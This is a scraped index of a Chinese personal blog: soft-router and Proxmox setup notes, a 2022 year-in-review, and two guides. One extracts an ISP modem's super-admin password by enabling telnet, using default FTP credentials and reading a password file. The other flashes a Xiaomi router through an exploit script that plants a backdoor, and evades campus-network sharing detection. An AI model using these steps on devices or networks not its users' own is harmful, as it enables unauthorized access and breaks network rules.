引导盘算制作好了。如果引导盘安装完成以后想要恢复成原来U盘，插上U盘，注意一下识别的盘符，引导类型选择为非可引导重新格式化一下即可，文件系统 FAT32 不能写入超过 2G 大小的文件，所以我一般选 NTFS。 ","date":"2023-02-03","objectID":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/:3:0","series":null,"tags":["软路由"],"title":"软路由日记(一)","uri":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/#restful-制作安装"},{"categories":["瞎折腾"],"content":"\r虚拟机网段规划分配因为安装的时候需要配置 PVE 网络的网关，既然用了软路由肯定是要用 OpenWrt、爱快这种路由系统装到虚拟机里，所以在安装之前先规划一下虚拟机的 IP 分配问题。以我安装的 OpenWrt 为例。 我打算把软路由作为旁路由使用，不会影响家里爸妈用网体验，自己只需要本地改一下 WIFI 的网关为软路由地址即可。因为我家的入户路由所在的 IP 段是 192.168.1.0/24 ，所以我选择一个其他的网段如 192.168.5.0/24，避免和主路由所在的网段搞混。选择 PVE 系统的 IP 为 192.168.5.2，OpenWrt 虚拟机的 IP 为 192.168.5.3，其他虚拟机顺延。所以在安装 PVE 系统的时候网关需要填为 OpenWrt 准备的虚拟机地址 192.168.5.3，PVE 地址也需要修改为对应的。 所以最后的结果就是： PVE 主系统：192.168.5.2 OpenWrt：192.168.5.3 Xbantu：192.168.5.4 …… 如果是直接作为主路由拨号使用，网关同样要填上 OpenWrt 的地址，因为要用 OpenWrt 拨号。 ","date":"2023-02-03","objectID":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/:4:0","series":null,"tags":["软路由"],"title":"软路由日记(一)","uri":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/#虚拟机网段规划分配"},{"categories":["瞎折腾"],"content":"\r安装 PVE 系统U盘插上软路由，注意一下启动界面提示的进入 BIOS 界面的按键，我的是 F7，如果不一样问客服或者搜一搜。选择U盘作为引导盘启动安装系统，找一下自己的U盘名称。 接下来进入PVE的安装界面。我已经装好系统了没图，可以看着上面推荐的视频里来，界面依次是： 选择默认的硬盘。 输入国家、时区、键盘语言。 设置管理员的密码、确认密码，设置邮箱。 这个邮箱我暂时还没有用到，可能 PVE 官方远程管理用得上，先填一个能使用的吧。 设置管理网卡口、域名、虚拟机 IP 段、网关、DNS。 网卡的选择是用于管理 PVE 虚拟机的网卡。比如我的软路由有四个物理网卡，我选择其中一个物理插上网线用来管理 PVE 及其虚拟机，其他三个物理网卡分配给其他虚拟机使用，通常是不可以直接访问 PVE 管理面板的。下拉列表有网卡真实的 MAC 地址，看最后两位一般是有顺序的，我也是大致对应软路由上的物理网口，应该是从小到大吧，我选择了第四个最后一个网口最为 PVE 的管理网口。 域名可能和 PVE 官方的远程管理有关。虚拟机 IP 段就是 PVE 管理的虚拟机可获得的 IP 范围。DNS 不多说了。 网关的设置，在虚拟机网段规划分配章节中有说明，填上。 确认填写信息 确认安装后稍等一段时间，PVE 会自动重启，系统选择 Proxmox VE GUN/Linux，之后会进入 PVE 系统的登陆页面。 登陆的用户名是 root，密码是刚刚安装时填写的密码。上面的信息是 PVE 的 Web 控制台地址，图中的地址可能和我的不一样，这个和前面设置的 IP 段有关。 ","date":"2023-02-03","objectID":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/:5:0","series":null,"tags":["软路由"],"title":"软路由日记(一)","uri":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/#安装-pve-系统"},{"categories":["瞎折腾"],"content":"\r连接 PVE 主机安装完成以后，使用网线连接软路由，并配置自己电脑的有线网卡保证和软路由在同一个网段。比如我前面规划我的 IP 网段为 192.168.5.0/24，电脑随便填一个不会冲突的 IP，网关和 DNS 可以填为 OpenWrt 预留的地址。 之后可以直接访问安装成功时提示的 PVE Web 控制台地址和端口，即使没有证书也要使用 https 访问，浏览器高级选项中有继续访问。用户名是 root 密码就是安装时填写的。下面可以选择语言为简体中文。可能会有一个其他提示直接跳过即可。 ","date":"2023-02-03","objectID":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/:5:1","series":null,"tags":["软路由"],"title":"软路由日记(一)","uri":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/#连接-pve-主机"},{"categories":["瞎折腾"],"content":"\r一些配置为了方便一些虚拟机可以直通硬件设备，比如 NAS 直通硬盘，提高工作效率，所以需要对 PVE 设置并开启硬件直通。 前面步骤连上软路由，使用 Shell 连接 PVE 系统，以上面为例地址为 192.168.5.2，用户名密码同上面。虚拟的相关技术不太懂，本人也是跟着操作的。 偶然发现一篇文章讲了一些相关内容，内核大佬请看 [转]关于Linux grub配置iommu=pt intel_iommu=on ","date":"2023-02-03","objectID":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/:6:0","series":null,"tags":["软路由"],"title":"软路由日记(一)","uri":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/#一些配置"},{"categories":["瞎折腾"],"content":"\rPVE直通特性功能注意 Intel 和 AMD 的CPU 一些参数不一样，我使用的 J4125 是 Intel 的。修改的文件都是 /etc/default/grub ，需要修改的参数是 GRUB_CMDLINE_LINUX_DEFAULT，默认值应该是 text GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\"\r根据 CPU 不同需要修改成 Intel CPU text GRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on iommu=pt\"\rAMD CPU text GRUB_CMDLINE_LINUX_DEFAULT=\"quiet amd_iommu=on iommu=pt\"\r注意参数之间的空格，修改之后保存退出，执行指令 update-grub 更新一下引导程序，出现 done字样就算成功。 ","date":"2023-02-03","objectID":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/:6:1","series":null,"tags":["软路由"],"title":"软路由日记(一)","uri":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/#pve直通特性功能"},{"categories":["瞎折腾"],"content":"\r增加模块接下来增加一些模块，修改 /etc/modules文件，添加#号下面的几个模块。 text # /etc/modules: kernel modules to load at boot time. # # This file contains the names of kernel modules that should be loaded # at boot time, one per line. Lines beginning with \"#\" are ignored. vfio vfio_iommu_type1 vfio_pci vfio_virqfd\r然后执行指令 update-initramfs -u -k all 对模块的升级。没有出现 Error 字样就算成功了，之后 reboot 重启一下。 ","date":"2023-02-03","objectID":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/:6:2","series":null,"tags":["软路由"],"title":"软路由日记(一)","uri":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/#增加模块"},{"categories":["瞎折腾"],"content":"\r结束这一篇就先写到 PVE 的安装和配置直通，下一篇打算写自己经历的固件的选择和安装。软路由老早就装好了，当时也没截图凭借一些其他的教程写了自己的经过，自己挖的坑一定要填上！ ","date":"2023-02-03","objectID":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/:7:0","series":null,"tags":["软路由"],"title":"软路由日记(一)","uri":"/posts/play_time/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/#结束"},{"categories":["瞎折腾"],"content":"折腾软路由百忙之中抽时间来简单水一篇。 有这个需求是因为目前在家里是用另一个无线路由器桥接联通的光猫的，但是在dhcp 里死活找不到桥接路由器分配的 ip，然后插上软路由竟然又把 ip 分配给软路由了，真是不服不行。 之前装联通宽带的时候尝试过找师傅要超级管理员的密码，但是师傅给我打哈哈糊弄过去了，给的一个普通 user 用户并没有静态 ip 的权限，所以就去网上找教程了，自己记录一下。 原文地址：https://www.right.com.cn/forum/thread-8253868-1-1.html 设备型号 SK-D748-C ","date":"2023-01-04","objectID":"/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/:0:0","series":null,"tags":null,"title":"中国联通SK-D748光猫超级密码获取","uri":"/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/#"},{"categories":["瞎折腾"],"content":"\r第一步保证可以局域网内正常访问联通光猫的管理界面。比如我的光猫地址为 192.168.1.1 ","date":"2023-01-04","objectID":"/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/:1:0","series":null,"tags":null,"title":"中国联通SK-D748光猫超级密码获取","uri":"/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/#第一步"},{"categories":["瞎折腾"],"content":"\r第二步打开隐藏配置界面：http://192.168.1.1/hidden_version_switch.html 勾选图中的 Telnet Enable 选项，网页会刷新一下，接下来测试一下光猫的 telent 是否成功打开。 开始 - 运行 - cmd，运行 telnet 192.168.1.1 提示输入登陆用户名称视为成功。 ","date":"2023-01-04","objectID":"/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/:2:0","series":null,"tags":null,"title":"中国联通SK-D748光猫超级密码获取","uri":"/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/#第二步"},{"categories":["瞎折腾"],"content":"\r第三步使用 ftp 连接光猫，默认的账号密码是 useradmin/useradmin ，在 /var/tmp 目录下的 telnet_su_passwd 文件就是管理员密码。 我最后获得的密码格式是：前半段是光猫默认的 wifi 密码，从 CUAdmin 开始到后面一串数字是超级管理员的登陆密码 超级管理员用户名是 CUAdmin ","date":"2023-01-04","objectID":"/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/:3:0","series":null,"tags":null,"title":"中国联通SK-D748光猫超级密码获取","uri":"/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/#第三步"},{"categories":["瞎折腾"],"content":"\r其他说明 不要尝试在 ftp 里随意删除软件，可能导致设备异常 获取超级管理员权限后，修改任何设置前自行评估有无风险。 ","date":"2023-01-04","objectID":"/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/:4:0","series":null,"tags":null,"title":"中国联通SK-D748光猫超级密码获取","uri":"/posts/play_time/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/#其他说明"},{"categories":["年度总结"],"content":"今年过得可真是太快了，不知道从哪开始写。前几天不小心点开微博，首页一句话想想只能苦笑一下，所有人应该都过得差不多吧。今年我乱过的，明年我一定好好过。 ","date":"2022-12-31","objectID":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:0:0","series":null,"tags":null,"title":"2022年度总结","uri":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#"},{"categories":["年度总结"],"content":"\r学业可能到现在也不知道当时为了什么考研，可能就是觉得听了大环境下找工作不容易，自己觉得在本科学校体验不太好，想上个像样的大学，考前一阵子还记得说过：XXX（自己学校）狗都不来，现在调剂回本校了，到考前一天所有的书可能连一遍都没过完，数学只能说本科那几门都没整明白。本来目标也没多高，到调剂的时候一降再降，算了，有学上就行不挑了。 现在只要是个计算机专业研究生基本上都逃不过人工智能的大门，无论是什么方向都会往上面靠，可能这就是大势所趋吧，我反正只能提起半个兴趣，也许我对所有东西都只能提起半个兴趣。人工智能又是和数学挺有关联的，自己考研数学都没整好，现在学的一门人工智能数学真的是边看边摇头。出来混迟早要还的。 然后学校的培养计划是学硕专硕都要发文章，本来自己的表达能力都不太行，又想了想自己本科的毕业设计论文，既来之则安之吧。 ","date":"2022-12-31","objectID":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:1:0","series":null,"tags":null,"title":"2022年度总结","uri":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#学业"},{"categories":["年度总结"],"content":"\r新冠疫情好像就是今年年初的时候开开始全员核酸，然后大四最后在学校基本上过两天就要下去排个队，然后学校组织的又不行，基本上一下去就要一个半小时在那站着，所以我基本上都是踩着尾去的。今年过得如此的快跟这个全员核酸和封闭逃不了干系，天天坐在屋子里面，一晃一天过去了，天天就跟乌龟一样都没动过，自己也没怎么运动过。 然后年底阵子封控放开了，家里亲戚和认识的人基本都阳了个遍，我在家发烧了两波，刚好还都是在线上考试之后，有一晚上真是烧的顶不住了，半夜起来手机放旁边听歌还觉得好受了点，写这篇总结的时候已经差不多完全好了。就这样吧，反正也放开了，以后说不定就再也没有新冠疫情导致各种封闭了，在后头的好日子应该快来了吧啊？ ","date":"2022-12-31","objectID":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:2:0","series":null,"tags":null,"title":"2022年度总结","uri":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#新冠疫情"},{"categories":["年度总结"],"content":"\r家人之前还会担心爸妈会在我不在家的时候家里闹矛盾什么的，现在感觉爸妈快退休了还是心态变了，现在俩人也会吵就是很快就笑了，这样子我在学校的时候也不会太担心了，总之确实跟之前也有很大的变化，希望身体都健健康康的就好。 我姐年底的时候出国读博了，就如我姐之前说的她是真的惨，从幼儿园开始连着上了 30 年学，不过这应该也就是最后了，以她的专业，只要能顺利毕业接下来真就是好日子了。 ","date":"2022-12-31","objectID":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":null,"title":"2022年度总结","uri":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#家人"},{"categories":["年度总结"],"content":"\r毕业现在想想有点怀念本科最后做毕设那会，事也不算多，和其他的好几个宿舍天天都有联动活动，有点想起来小时候跟发小在外面疯一样，那种感觉真的是久违了。宿舍里两个去工作了，剩下三个考研只有我姑且算是考上了，但是我感觉他们每一个都比我努力的多，今年也都二战了，在这里祝他们都成功上岸吧，以后各自也都有自己的路要走了，这一次分别谁知道一下次会在哪见面，各位天山路远，山高水长，后会有期，江湖再见。 ","date":"2022-12-31","objectID":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:4:0","series":null,"tags":null,"title":"2022年度总结","uri":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#毕业"},{"categories":["年度总结"],"content":"\r感情算是失败过一次吧，但是也不算，反正现在性格小开阔一下，至少不像之前那样跟没见过女人一样 (😎👉😭🕶️) 年纪也快到了，爸妈开始正式跟我说这个问题了，之前从来都是闭口不谈，还声称我谈恋爱给我恋爱经费，但是我一个臭打游戏的，买个游戏都要蹲打折才行，这一点也得改一改。然后就是确实有点不懂人情世故，我要是女的我都觉得这个人看起来不太聪明有点妈宝的感觉。以后一个一个改吧，不然真就是相亲硬过日子了，感觉自己也是条件不咋地要求还挺高，到现在也没遇到真能豁出去的，自己也要胆大一些。 ","date":"2022-12-31","objectID":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:5:0","series":null,"tags":null,"title":"2022年度总结","uri":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#感情"},{"categories":["年度总结"],"content":"\r自己的想法昨天晚上高中同学回来了，一起遛弯聊了聊，他对他现在的工作挺不满意的想换了，想了下我再过两年就也该找工作了，但是天天只顾得上自己学和玩，除了程序员这一条路，其他能干啥也不知道，等到时候年纪大了被顶掉了咋办？确实想太多也会让步伐变慢，带着这个问题等遇到新信息再想吧。我也又一次确认了一下自己努力的目标就是为了到将来的时候能过得轻松点就很满足了。 最近几个月买了个软路由，还应验了之前一篇文章里写的，过年别人在出去吃喝，我在家里折腾黑盒子，问我收获了什么，就是组了一个 all in one 看视频不要广告 blablabla，自己随地就可以魔法，父母只是沉默不语，看着自己家的电表转的又快了。哈哈哈 自从从去年7 8月份加入了实验室吧，我就每天把自己安排的满满当当，从早上到晚上每一件事都用尽全力，不管是打游戏还是去学习和折腾些技术，感觉一点其他的时间都没有给自己留，一直都是火力全开往前走也没有停下来好好想一想，前几天在电视上也看到了一个广告，一个老奶奶教自己孙女画画说道：“画画要留白，人生也一样，不要把生活填得太满，多给自己留些空间”。也觉得这样排的满满当当自己有点吃不消了，而且好多东西也有点力不从心，开始变得有些木讷了，明年就先学学会劳逸结合，但是效率还是不能丢。 现在是 22年12月31日23点25分，赶在这一年的最后把总结写出来了，就这样吧，今年确实过得听梦幻的，最近这三年都听梦幻的，翻了一遍相册也是没有什么大事可回忆的，平平淡淡也挺好的吧。 再见 2022 ！ ","date":"2022-12-31","objectID":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/:6:0","series":null,"tags":null,"title":"2022年度总结","uri":"/posts/annual/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/#自己的想法"},{"categories":["瞎折腾"],"content":"\r前言我们学校的校园网不光每个月要宽带费 20/月，而且要绑定一个校园卡，我的一个月月租下来要 49/月，而且校园网还限制设备数量只能连接一个，我一般都是电脑连校园网，手机用流量，但是教职工的校园网就可以两个设备连接，寝室里目前有6+个设备也需要联网，商量以后打算搞个路由器贡献一个账号连校园网开 wifi，之前就见贴吧有老哥已经成功了，所以自己也尝试一下做个记录，给以后的同学看也不错。由于我已经连好路由器了，所以部分图片取自网络图片作为参考，我也尽量说的详细些。 注意\r对于任何硬件、软件的损坏，本人没有赔偿的责任，哪怕这样的后果是因教程中的错误造成的。也请认真对待每一步操作，也许因为你的操作不当硬件因此变成一块砖。另外本教程的操作会使你的路由器失去保修。 本篇文章仅起指导性的作用，在操作的过程中遇到的问题也许我也没有遇到过，请先自行尝试解决，如果我有空也会尽量帮助。 学校明令禁止安装路由器，本人绝对没有怂恿或建议任何同学安装路由器，本人安装路由器的行为完全属于个人意志，仅仅作为个人的学习技术交流，请读者在安装好路由器之后 24 小时内再将之拆除，请按照学校指明的方式连接到互联网。如果学校根据校规等文件追究责任，与本人无关。 叠甲过 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:1:0","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#前言"},{"categories":["瞎折腾"],"content":"\r前置知识校园网插入网线认证是要模拟 Dr.com 软件的发包认证，除了账号密码认证校园网以外，软件还会定时发送心跳包保证校园网连接。 zut 的校园网认证格式为账号：\\r\\n你的学号@[unicom|telecom|cmcc] ，其中 @ 后面的是你的运营商，对照前面的格式分别为：联通、电信、移动，例如我的是联通校园网，账号就是：\\r\\n2022********@unicom，密码就是你自己的密码。 zut 校园网的客户端版本为：6.0.0（P） 校园网的防检测插件原理还没有写，自己用的 小米4C 是社区固件资源中自带的。想看原理可以看最后挖坑部分 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:2:0","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#前置知识"},{"categories":["瞎折腾"],"content":"\r需要的材料本教程使用的路由器型号 Xiaomi router 4c pdd二手35，安装的系统 openwrt。请注意：路由器的选择直接影响到你后面的操作，我专门在网上挑了好久选的这个路由器，但是，唯独这个路由器的社区资源最特殊，本人也是经过各种尝试才成功。如果选择其他路由器，本教程中的主要安装思路相同，但是需要自行寻找适合自己路由器的固件资源。 路由器。 网线两根。一根我买的8m的，因为宿舍AP在门上面，另一根需要连接路由器和电脑，长度自己看。 开通校园网的账号。 自己思考的能力。 需要的软件压缩包：zut_Xiaomi_router_4c.zip。其中包含 dogcom.zip。用来进行校园网模拟拨号，定时发送心跳包的工具。 R3GV2 patches.zip。刷机的主要部分包含了：R3GV2 patches（前期连接路由器的工具）、Mi4C.bin（小米 4c 的 openwrt 固件自带防检测插件）、breed.bin（breed web 恢复控制台） MobaXterm_Portable.zip。用来连接路由器和传输文件的软件 小米路由器4C恢复官方固件工具包.zip。刷成砖的官方补救措施 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:3:0","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#需要的材料"},{"categories":["瞎折腾"],"content":"\r教程参考的网站或资料 贴吧老哥的教程：https://tieba.baidu.com/p/7760362347 广东工业大学在 github 上的教程：https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt 【记录】小米路由器 4C 刷机过程：https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt/issues/27 R4CM，说说我的小米路由器4C刷机过程：不用Linux也不用虚拟机…… ：https://www.right.com.cn/FORUM/thread-4047571-1-1.html 路由器认证校园网drcom：https://www.brothereye.cn/router/669/ ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:4:0","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#教程参考的网站或资料"},{"categories":["瞎折腾"],"content":"\r开工接通路由器电源，使用网线连接路由器，进入初始化管理页面通常是 192.168.1.1，能跳过就跳过，下图右选择无需拨号即可。（网络图片仅供参考） 接下来设置 wifi 名称和密码，可以勾选管理密码和 wifi 密码相同的框，保存以后会提示新的管理后台地址，通常是 192.168.31.1，使用管理密码登陆以后，显示路由器界面就算初始化成功。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:5:0","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#开工"},{"categories":["瞎折腾"],"content":"\r刷入不死 Breed Breed 是国内个人 hackpascal 开发的闭源 Bootloader（引导加载器，即为用于加载操作系统的程序），也被称为“不死鸟”。 因为有些官方升级固件自带 bootloader，如果从官方固件升级，会导致现有 bootloader 被覆盖。而当 Breed 更新固件时，它会自动删除固件附带的引导加载程序，因此可以防止 Breed 被覆盖。 刷入 Breed 的作用就是为后面刷固件做个保险，失败以后可以进行 reset 复位，防止路由器刷成一块砖。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:6:0","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#刷入不死-breed"},{"categories":["瞎折腾"],"content":"\r开启路由器 telnet 和 ftp打开前面下载的压缩包中的 R3GV2 patches 文件夹，运行其中的 0.start_main.bat，这个批处理的命令主要是运行了文件夹中的 main.py ，而 main.py 做的事情就是尝试发现你的路由器后台地址，然后需要输入管理后台的密码，然后执行一些 exploit 在路由器中写入后门，界面中出现 Done 字样就算成功。 这里遇到过扫描不到管理后台的情况，如果遇到了可以参考以下步骤。修改 main.py 文件中的第 10 行到 15 行，删掉 python line4 = subprocess.check_output([\"cmd\",\"/c\",\"chcp\",\"437\",\"\u0026\",\"tracert\",\"-d\",\"-h\",\"1\",\"1.1.1.1\"]).decode().split(\"\\r\\n\")[4].strip().split(\" \") for data in line4: if len(data.split(\".\")) == 4: router_ip_address = data break\r添加 router_ip_address 变量为你的管理后台地址，通常为 192.168.31.1 python router_ip_address = '192.168.31.1'\r接下来使用 MobaXterm 连接路由器，新建一个 session 类型选择 telnet，这时的路由器地址就是管理后台的地址应该是 192.168.31.1，用户为 root。 ps：如果连接不成功就多运行几次 0.start_main.bat。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:6:1","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#开启路由器-telnet-和-ftp"},{"categories":["瞎折腾"],"content":"\r备份原路由器信息以下步骤请注意！！！ 最好备份以下路由器原本分区文件，以防不备之需，其中eeprom.bin 是最重要的，因为刷入 breed 以后可能会导致 MAC 地址全 0，需要刷入一次这个文件才会恢复。执行以下命令，of 后面的就是文件输出的路径 text dd if=/dev/mtd0 of=/tmp/all.bin dd if=/dev/mtd2 of=/tmp/bootloader.bin dd if=/dev/mtd3 of=/tmp/eeprom.bin\r打开电脑资源管理器，输入 ftp://192.168.31.1 按回车，使用 ftp 连接路由器（为什么不用 MobaXterm，因为后门创建的 ftp 是匿名用户，直接使用 windows 资源管理器打开更方便） 找到 tmp 文件夹其中的三个文件：all.bin 、bootloader.bin 和 eeprom.bin，复制到本地做备份，下载以后一定要看清楚三个文件的大小分别是 16MB 、64k 和 64k，如果大小是 1k 那就是错误的，再备份几次，也有可能是后门没写牢再执行 0.start_main.bat 试试。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:6:2","series":null,"tags":["校园网"],"title":"ZUT 使用路由器连接校园网","uri":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/#备份原路由器信息"},{"categories":["瞎折腾"],"content":"\r上传 Breed 文件并刷入在资源管理器的 ftp 中把 breed.bin 文件上传到 /tmp 文件夹下，在 telnet 中执行指令刷入引导加载器 text mtd write /tmp/breed.bin Bootloader\r不提示错误信息就是刷入成功了。 ","date":"2022-10-11","objectID":"/posts/play_time/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/:6:3","series":null,"tags":["校园网"],"title":"ZUT 